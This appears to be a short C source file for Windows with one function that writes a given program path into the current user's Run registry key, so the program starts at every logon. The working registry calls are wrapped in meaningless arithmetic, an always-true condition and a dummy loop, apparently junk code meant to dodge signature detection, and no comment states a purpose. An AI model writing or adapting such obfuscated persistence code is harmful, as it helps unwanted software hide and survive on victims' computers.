#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v4(const char* name, const char* path){
    HKEY hKey;
    int x = 10;
    int y = 20;
    if ((x * x + y * y) > 0) {
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            for (int i = 0; i < 3; i++) { x += i; }
            RegSetValueExA(hKey, name, 0, REG_SZ, (const BYTE*)path, lstrlenA(path) + 1);
            if (y > 5) RegCloseKey(hKey);
        }
    }
}